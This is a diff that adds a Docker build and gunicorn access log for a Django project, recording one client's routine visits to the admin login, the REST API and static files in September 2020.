@@ -1,0 +1,1212 @@
+
+  - Installing psycopg2-binary (2.8.6)
+  - Installing whitenoise (5.2.0)
+Removing intermediate container c5923c76476e
+ ---> 0b9dda0133d3
+Successfully built 0b9dda0133d3
+Successfully tagged django_perms_prod_web:latest
+Attaching to django_perms_prod_web_1
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [1] [INFO] Starting gunicorn 20.0.4
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [1] [INFO] Using worker: sync
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [7] [INFO] Booting worker with pid: 7
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [8] [INFO] Booting worker with pid: 8
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [9] [INFO] Booting worker with pid: 9
+[36mweb_1  |[0m [2020-09-19 23:32:56 +0000] [10] [INFO] Booting worker with pid: 10
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:30 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:30 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2194 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:30 +0000] "GET /static/admin/css/base.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:30 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:30 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:30 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:31 +0000] "GET /static/admin/css/login.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:31 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:31 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:31 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:49 +0000] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:49 +0000] "GET /admin/ HTTP/1.1" 200 5062 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:33:50 +0000] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:36:14 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:47 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /api/v1/ HTTP/1.1" 200 10894 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:52 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /api-auth/logout/?next=/api/v1/ HTTP/1.1" 302 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:55 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:56 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:56 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:57 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:57 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:57 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:57 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:57 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:58 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:38:59 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2194 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/css/login.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:34 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /admin/ HTTP/1.1" 200 5062 "http://206.189.68.96/admin/login/?next=/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:39 +0000] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /admin/auth/user/add/ HTTP/1.1" 200 7347 "http://206.189.68.96/admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
